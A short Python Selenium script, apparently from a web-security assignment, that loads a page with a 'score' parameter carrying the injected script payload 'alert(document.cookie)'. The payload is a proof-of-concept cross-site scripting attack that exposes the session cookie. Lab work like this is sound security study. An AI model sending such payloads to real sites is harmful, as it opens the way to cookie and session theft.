from selenium import webdriver
chromium_path = "/usr/lib/chromium-browser/chromedriver"
driver = webdriver.Chrome(chromium_path)
driver.get("http://www.wsb.com/Assignment2/case05.php?score=6%3Balert(document.cookie)")
